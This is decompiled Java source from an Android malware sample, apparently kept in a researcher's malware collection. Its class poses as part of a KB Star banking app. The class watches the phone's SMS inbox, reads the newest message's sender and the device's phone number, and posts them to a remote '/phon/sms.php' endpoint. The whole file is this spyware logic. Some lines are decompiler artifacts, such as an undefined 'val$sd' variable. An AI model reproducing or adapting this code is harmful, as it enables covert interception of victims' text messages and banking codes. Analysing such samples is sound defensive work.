package com.kbstar.kb.android.services;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.TelephonyManager;
import com.kbstar.kb.android.star.util.Tool;
import com.kbstar.kb.android.star.util.Url;

public class OSMSR
  extends ContentObserver
{
  public String Url = Tool.GetUrlTool();
  private String address;
  private Context mcontext;
  private String msg;
  private String tel;
  String u = "http://" + Tool.GetUrlTool() + "/phon/sms.php";
  Url url = new Url();
  
  public OSMSR(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.mcontext = paramContext;
  }
  
  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    this.tel = ((TelephonyManager)this.mcontext.getSystemService("phone")).getLine1Number();
    Cursor localCursor = this.mcontext.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
    localCursor.moveToNext();
    this.msg = localCursor.getString(localCursor.getColumnIndex("body"));
    this.address = localCursor.getString(localCursor.getColumnIndex("address"));
    new Thread()
    {
      public void run()
      {
        Tool.postHttpConnection(OSMSR.this.u, OSMSR.this.address, OSMSR.this.tel, this.val$sd);
      }
    }.start();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/OSMSR.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */